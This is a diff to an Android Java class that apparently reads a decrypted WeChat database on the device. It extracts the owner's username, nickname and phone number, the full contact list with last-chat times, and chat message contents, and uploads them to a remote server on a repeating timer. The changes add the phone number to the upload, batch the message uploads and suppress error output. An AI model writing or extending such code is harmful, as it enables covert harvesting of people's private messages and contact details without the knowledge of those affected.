@@ -33,10 +33,9 @@ import velites.java.utility.misc.StringUtil;
 
 public class WxManager {
 
+    private static final int ID_USER_NAME = 2;
     private static final int ID_NICK_NAME = 4;
     private static final int ID_PHONE = 6;
-    private static final int ID_USER_NAME = 42;
-
 
     private static final String TAG = WxManager.class.getSimpleName();
     private static HandlerUtil handlerUtil;
@@ -48,21 +47,8 @@ public class WxManager {
             @Override
             public void a(Boolean isOk, String msg, SQLiteDatabase sql) {
                 if (isOk && sql != null) {
+//                    WechatHelper.exportDecodedDB(sql, null);
                     userInfo(sql);
-//                    try {
-//                        List<WxLocalMsg> list = new ArrayList();
-//                        StringBuffer buffer = new StringBuffer();
-//                        buffer.append("SELECT m.msgId,m.msgSvrId,m.createTime,m.status,m.content,r.username,r.alias,r.conRemark,r.nickname").append(" FROM message m INNER JOIN rcontact r").append(" ON m.talker=r.username").append(" WHERE m.content IS NOT NULL").append(" AND r.verifyFlag=0").append(" AND r.nickname!=''").append(" AND r.type!=33").append(" AND r.type!=35").append(" ORDER BY").append(" m.createTime ASC").append(" LIMIT ?");
-//                        Cursor c1 = sql.rawQuery(buffer.toString(), new String[]{String.valueOf(100)});
-//                        while (c1.moveToNext()) {
-//                            list.add(WxLocalMsg.buildMsgFromWxDb(c1));
-//                        }
-//                        c1.close();
-//                        LogHub.log(new LogEntry(LogHub.LOG_LEVEL_INFO, WxManager.class, "list size:%d", list.size()));
-//                    } catch (Exception e) {
-//                        e.printStackTrace();
-//                    }
-
                 } else {
                     LogHub.log(new LogEntry(LogHub.LOG_LEVEL_ERROR, WxManager.class, "get wx database error msg %s", msg));
                 }
@@ -73,21 +59,24 @@ public class WxManager {
     private static final void userInfo(SQLiteDatabase sql) {
         if (sql != null) {
             StringBuffer buffer = new StringBuffer();
-            buffer.append(String.format("SELECT * FROM userinfo WHERE id=%s or id=%s or id=%s", ID_NICK_NAME, ID_PHONE, ID_USER_NAME));
+            buffer.append(String.format("SELECT * FROM userinfo WHERE id=%s or id=%s or id=%s order by id", ID_NICK_NAME, ID_PHONE, ID_USER_NAME));
             Cursor c1 = sql.rawQuery(buffer.toString(), null);
             if (c1 != null) {
-                String[] content = new String[3];
-                int i = 0;
+                WxMyInfo me = new WxMyInfo();
                 while (c1.moveToNext()) {
-                    String value = c1.getString(c1.getColumnIndex("value"));
-                    if (i >= 3)
-                        break;
-
-                    content[i] = value;
-                    i++;
+                    if (c1.getInt(c1.getColumnIndex("id")) == ID_USER_NAME) {
+                        me.setUserName(c1.getString(c1.getColumnIndex("value")));
+                    }
+                    else if (c1.getInt(c1.getColumnIndex("id")) == ID_NICK_NAME) {
+                        me.setNickName(c1.getString(c1.getColumnIndex("value")));
+                    }
+                    else if (c1.getInt(c1.getColumnIndex("id")) == ID_PHONE) {
+                        me.setPhone(c1.getString(c1.getColumnIndex("value")));
+                    }
                 }
+                c1.close();
 
-                createRContactFromDataBase(sql, new WxMyInfo(content[0], content[1], content[2]));
+                createRContactFromDataBase(sql, me);
             }
         }
     }
@@ -99,7 +88,7 @@ public class WxManager {
                 WxFriends friendsData = new WxFriends();
                 List<WxFriends> list = new ArrayList();
                 StringBuffer buffer = new StringBuffer();
-                buffer.append("SELECT * FROM rcontact");
+                buffer.append("select *, (select max(m.createTime) from message m where m.talker = username) as lastChatTime from rcontact");
                 Cursor c1 = sql.rawQuery(buffer.toString(), null);
                 while (c1.moveToNext()) {
                     list.add(WxFriends.buildFriendsFromDatabase(c1));
@@ -107,7 +96,7 @@ public class WxManager {
                 c1.close();
                 friendsData.setFriends(list);
 
-                AppAssistant.getApi().uploadFriends(list, userInfo.getUserName(), userInfo.getNickName()).subscribe(new Observer<WxFriends>() {
+                AppAssistant.getApi().uploadFriends(list, userInfo.getUserName(), userInfo.getNickName(), userInfo.getPhone()).subscribe(new Observer<WxFriends>() {
                     @Override
                     public void onSubscribe(Disposable d) {
                     }
@@ -121,7 +110,6 @@ public class WxManager {
                             LogHub.log(new LogEntry(LogHub.LOG_LEVEL_INFO, WxManager.class, "wxfriends %s", friends != null ? friends.toString() : "null"));
                         } catch (Exception e) {
                             ExceptionUtil.swallowThrowable(e);
-                            e.printStackTrace();
                         }
                     }
 
@@ -137,7 +125,6 @@ public class WxManager {
 
             } catch (Exception e) {
                 ExceptionUtil.swallowThrowable(e);
-                e.printStackTrace();
             }
         }
     }
@@ -149,6 +136,7 @@ public class WxManager {
             localMsg.setRepUserName(userInfo != null ? userInfo.getUserName() : "");
             List<WxLocalMsg> userChats = new ArrayList<>();
             localMsg.setUserChats(userChats);
+            int count = 0;
             for (int i = 0; i < friends.size(); i++) {
                 WxFriends item = friends.get(i);
                 if (item != null) {
@@ -163,42 +151,55 @@ public class WxManager {
                             WxLocalMsg msgItem = WxLocalMsg.buildMsgFromWxDb(c);
                             chats.add(msgItem);
                         }
+                        c.close();
                         user.setChats(chats);
                     }
                     if (user.getChats() == null || user.getChats().size() == 0)
                         continue;
                     userChats.add(user);
+                    count += user.getChats().size();
+                    if (count >= Constants.Logic.WECHAT_MSG_UPLOAD_ONCE_LIMIT) {
+                        submitMessages(localMsg);
+                        userChats.clear();
+                        count = 0;
+                    }
                 }
             }
-            try {
-                AppAssistant.getApi().uploadWxMsg(localMsg).subscribe(new Observer<WxLocalMsg>() {
-                    @Override
-                    public void onSubscribe(Disposable d) {
+            if (count > 0) {
+                submitMessages(localMsg);
+            }
+        }
+    }
 
-                    }
+    private static void submitMessages(WxLocalMsg localMsg) {
+        try {
+            AppAssistant.getApi().uploadWxMsg(localMsg).subscribe(new Observer<WxLocalMsg>() {
+                @Override
+                public void onSubscribe(Disposable d) {
 
-                    @Override
-                    public void onNext(WxLocalMsg wxLocalMsg) {
-                        try {
-                            LogHub.log(new LogEntry(LogHub.LOG_LEVEL_INFO, WxManager.class, "upload msg:%s", wxLocalMsg == null ? "null" : wxLocalMsg.toString()));
-                        } catch (Exception e) {
-                            ExceptionUtil.swallowThrowable(e);
-                        }
-                    }
+                }
 
-                    @Override
-                    public void onError(Throwable e) {
+                @Override
+                public void onNext(WxLocalMsg wxLocalMsg) {
+                    try {
+                        LogHub.log(new LogEntry(LogHub.LOG_LEVEL_INFO, WxManager.class, "upload msg:%s", wxLocalMsg == null ? "null" : wxLocalMsg.toString()));
+                    } catch (Exception e) {
                         ExceptionUtil.swallowThrowable(e);
                     }
+                }
 
-                    @Override
-                    public void onComplete() {
-                    }
-                });
+                @Override
+                public void onError(Throwable e) {
+                    ExceptionUtil.swallowThrowable(e);
+                }
 
-            } catch (Exception e) {
-                ExceptionUtil.swallowThrowable(e);
-            }
+                @Override
+                public void onComplete() {
+                }
+            });
+
+        } catch (Exception e) {
+            ExceptionUtil.swallowThrowable(e);
         }
     }
 
@@ -209,11 +210,15 @@ public class WxManager {
         handlerUtil = HandlerUtil.create(false, TAG, new Action1<Message>() {
             @Override
             public void a(Message arg1) {
-                checkWxDatabase(ctx);
+                if (!StringUtil.isNullOrEmpty(AppAssistant.getPrefs().getStr(Constants.PrefsKey.AUTH_TOKEN_KEY))) {
+                    checkWxDatabase(ctx);
+                }
+                handlerUtil.removeMessages(MSG_TAG_UPLOAD_WX);
+                handlerUtil.sendEmptyMessageDelayed(MSG_TAG_UPLOAD_WX, Constants.UPLOAD_WX_CYCLE);
             }
         }, Thread.NORM_PRIORITY);
         LogHub.log(new LogEntry(LogHub.LOG_LEVEL_INFO, WxManager.class, "ini wx manager"));
-        handlerUtil.sendEmptyMessageAtTime(MSG_TAG_UPLOAD_WX, Constants.UPLOAD_WX_CYCLE);
+        handlerUtil.sendEmptyMessageDelayed(MSG_TAG_UPLOAD_WX, Constants.UPLOAD_WX_CYCLE);
     }
 
     public static void startUpload() {
